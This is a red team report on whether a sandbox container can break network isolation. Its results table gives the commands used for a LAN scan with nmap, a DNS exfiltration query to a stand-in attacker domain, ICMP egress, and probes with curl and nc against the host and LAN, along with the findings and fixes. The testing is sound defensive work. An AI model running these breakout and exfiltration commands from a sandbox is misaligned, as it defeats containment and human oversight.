# Red Team Campaign 2 - Network Breakout

**Campaign ID:** RT-C2  
**Date:** 2026-05-09  
**Objective:** Break network isolation from inside sandbox container.

## Results table

| Test ID | Attack simulated | Command used | Observed result | Verdict | Remediation |
|---|---|---|---|---|---|
| RT-C2-001 | LAN subnet scan | `docker exec dasdocker-redteam sh -lc 'nmap -sn 192.168.0.0/24'` | Multiple live LAN hosts discovered | **FAILED TO BLOCK (P0)** | Deny RFC1918 egress and ARP/ICMP from sandbox |
| RT-C2-002 | DNS tunneling primitive | `docker exec dasdocker-redteam sh -lc 'dig +short verysecretdata.exfil.attacker.test @1.1.1.1'` | Query executed outbound to external resolver | **FAILED TO BLOCK (P0)** | Force DNS to internal allowlisted resolver only |
| RT-C2-003 | ICMP tunnel primitive | `docker exec dasdocker-redteam sh -lc 'ping -c 3 8.8.8.8'` | ICMP egress successful | **FAILED TO BLOCK (P0)** | Drop outbound ICMP in sandbox egress policy |
| RT-C2-004 | HTTP to known LAN IP | `docker exec dasdocker-redteam sh -lc 'curl -I --max-time 5 http://192.168.0.1'` | Received `HTTP/1.1 200 OK` | **FAILED TO BLOCK (P0)** | Deny LAN destination CIDRs by default |
| RT-C2-005 | Direct host mgmt IP connection | `docker exec dasdocker-redteam sh -lc 'nc -zv -w 3 192.168.0.1 22'` | TCP reached host (connection refused by service, not firewall) | **FAILED TO BLOCK (P0)** | Block host mgmt IP reachability from sandbox |
| RT-C2-006 | Lateral move by guessed bridge IPs | `for ip in 172.31...; do nc -z -w1 $ip 80; done` | No positive hit in sample attempts | PARTIAL | Add deterministic lateral movement test with known peer container |

## Campaign assessment

- Expected outcome for all six attacks was BLOCKED under zero-trust network isolation.
- Actual outcome shows **multiple confirmed breakouts**, including LAN host discovery and direct HTTP reachability.
- This is a **release-blocking incident**.

## Required follow-up (must be complete before Phase 5)

1. Enforce deny-by-default at container egress chain with explicit allowlist only.
2. Add automated runtime preflight:
   - fail session creation if `dasdocker-isolated` network missing;
   - fail if `DASDOCKER-FORWARD` policy chain missing.
3. Re-run this full campaign and archive packet captures proving drops.
